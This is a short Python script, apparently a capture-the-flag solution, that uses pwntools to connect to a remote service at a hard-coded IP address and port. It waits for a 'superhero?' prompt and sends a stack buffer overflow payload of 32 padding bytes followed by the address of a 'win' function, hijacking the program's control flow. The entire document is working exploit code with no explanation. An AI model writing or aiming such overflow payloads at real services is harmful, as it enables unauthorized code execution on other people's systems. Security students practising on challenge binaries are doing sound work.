from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31778)
r.recvuntil(b"superhero?")

win = 0x4011f6
payload = b"A" * 0x20 + p64(win)
r.sendline(payload)
print(r.recvall(timeout=2))
